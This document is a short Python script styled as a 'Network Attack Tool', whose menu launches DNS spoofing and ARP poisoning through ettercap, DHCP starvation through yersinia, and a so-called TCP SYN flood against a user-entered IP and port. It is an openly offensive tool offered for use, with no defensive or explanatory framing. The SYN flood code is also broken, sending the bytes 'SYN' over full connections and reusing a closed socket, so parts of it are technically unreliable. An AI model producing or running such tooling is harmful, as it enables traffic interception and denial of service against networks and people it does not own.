import os
import socket
import threading
import time
import platform
import clear

# Function to perform a DNS spoofing attack
def dns_spoofing_attack():
    print("Starting DNS Spoofing Attack...")
    os.system("ettercap -T -q -i wlan0 -P dns_spoof")

# Function to perform an ARP poisoning attack
def arp_poisoning_attack():
    print("Starting ARP Poisoning Attack...")
    os.system("ettercap -T -q -i wlan0 -P arp_poison")

# Function to perform a DHCP starvation attack
def dhcp_starvation_attack():
    print("Starting DHCP Starvation Attack...")
    os.system("yersinia -I wlan0 -d")

# Function to perform a TCP SYN flood attack
def tcp_syn_flood_attack(target_ip, target_port):
    print("Starting TCP SYN Flood Attack...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        sock.connect((target_ip, target_port))
        sock.send(b"SYN")
        sock.close()

# Main program
def main():
    while True:
        clear.clear()
        print("Welcome to the Network Attack Tool!")
        print("-------------------------------")
        print("1. DNS Spoofing Attack")
        print("2. ARP Poisoning Attack")
        print("3. DHCP Starvation Attack")
        print("4. TCP SYN Flood Attack")
        print("5. Quit")

        choice = input("Enter your choice: ")

        if choice == "1":
            clear.clear()
            threading.Thread(target=dns_spoofing_attack).start()
            print("DNS Spoofing Attack started!")
            input("Press Enter to continue...")
        elif choice == "2":
            clear.clear()
            threading.Thread(target=arp_poisoning_attack).start()
            print("ARP Poisoning Attack started!")
            input("Press Enter to continue...")
        elif choice == "3":
            clear.clear()
            threading.Thread(target=dhcp_starvation_attack).start()
            print("DHCP Starvation Attack started!")
            input("Press Enter to continue...")
        elif choice == "4":
            clear.clear()
            target_ip = input("Enter the target IP address: ")
            target_port = int(input("Enter the target port: "))
            threading.Thread(target=tcp_syn_flood_attack, args=(target_ip, target_port)).start()
            print("TCP SYN Flood Attack started!")
            input("Press Enter to continue...")
        elif choice == "5":
            clear.clear()
            print("Goodbye!")
            break
        else:
            clear.clear()
            print("Invalid choice. Try again!")
            input("Press Enter to continue...")

if __name__ == '__main__':
    main()
